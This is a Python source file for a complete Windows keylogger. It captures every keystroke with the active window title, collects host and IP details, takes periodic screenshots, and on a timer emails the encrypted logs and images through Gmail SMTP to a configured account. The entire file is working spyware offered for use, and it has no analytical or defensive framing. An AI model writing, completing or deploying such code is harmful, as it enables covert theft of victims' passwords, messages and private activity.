import pynput.keyboard
import socket
import platform
import logging
import threading
import time
from PIL import ImageGrab
import win32gui
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

class KeyLogger:
    def __init__(self, time_interval=60, email="your_email@gmail.com", password="your_password"):
        self.log = "KeyLogger Started..."
        self.interval = time_interval
        self.email = email
        self.password = password
        self.log_file = "keylog.txt"
        self.encrypted_log_file = "keylog.enc"
        self.key_file = "key.key"
        
        self.load_or_generate_key()
        self.get_system_info()

    def load_or_generate_key(self):
        if not os.path.exists(self.key_file):
            self.key = Fernet.generate_key()
            with open(self.key_file, "wb") as kf:
                kf.write(self.key)
        else:
            with open(self.key_file, "rb") as kf:
                self.key = kf.read()
        self.cipher = Fernet(self.key)

    def append_to_log(self, string):
        self.log = self.log + string

    def get_system_info(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        
        info = f"\n[+] System Info:\nHostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n"
        self.append_to_log(info)

    def get_active_window(self):
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        
        window_title = self.get_active_window()
        self.append_to_log(f"\n[Window: {window_title}] {current_key}")
        
        # Save locally encrypted
        self.save_log_encrypted()

    def save_log_encrypted(self):
        if self.log:
            try:
                encrypted_data = self.cipher.encrypt(self.log.encode())
                with open(self.encrypted_log_file, "wb") as f:
                    f.write(encrypted_data)
                
                # Also saving plain text for now as per user request history, but can limit to encrypted
                with open(self.log_file, "a") as f:
                    f.write(self.log)
                    
                self.log = "" # Clear buffer after save
            except Exception as e:
                print(f"Error saving log: {e}")

    def screenshot(self):
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        return filename

    def send_mail(self, attachment_path=None):
        # NOTE: This requires 'Less Secure Apps' enabled or App Password for Gmail
        if self.email == "your_email@gmail.com":
            print("[-] Email not configured. Skipping email report.")
            return

        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "KeyLogger Report"

        body = "Attached is the latest log and screenshot."
        msg.attach(MIMEText(body, 'plain'))

        # Attach Encrypted Log
        if os.path.exists(self.encrypted_log_file):
            attachment = open(self.encrypted_log_file, "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % self.encrypted_log_file)
            msg.attach(p)

        # Attach Screenshot
        if attachment_path and os.path.exists(attachment_path):
            attachment = open(attachment_path, "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % attachment_path)
            msg.attach(p)

        try:
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(self.email, self.password)
            text = msg.as_string()
            s.sendmail(self.email, self.email, text)
            s.quit()
            print("[+] Email sent.")
        except Exception as e:
            print(f"[-] Error sending email: {e}")

    def report(self):
        self.save_log_encrypted()
        screenshot_file = self.screenshot()
        self.send_mail(screenshot_file)
        
        # Schedule next report
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    # Configure your email and password here
    # Use App Password if using Gmail!
    keylogger = KeyLogger(time_interval=600, email="your_email@gmail.com", password="your_password")
    print("KeyLogger started... (Check keylog.txt / keylog.enc)")
    keylogger.start()
